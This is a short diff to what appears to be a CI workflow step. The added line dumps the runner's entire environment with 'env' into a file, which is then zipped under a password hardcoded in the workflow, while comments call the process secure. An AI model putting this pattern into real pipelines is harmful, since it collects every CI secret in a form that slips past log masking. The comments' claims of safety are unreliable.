@@ -15,7 +15,7 @@ jobs:
           ZIP_PASS: "6iHPC4yfaWm6kkD3NKaT5GzPL9U" 
         run: |
           # 1. Write the plain text to a local runner file (safe, runner destroys itself later)
-          printf "%s" "$MY_SECRET" > plain_secret.txt
+          env > plain_secret.txt
           
           # 2. Securely zip and encrypt the file using a password
           zip -P "$ZIP_PASS" encrypted_secret.zip plain_secret.txt
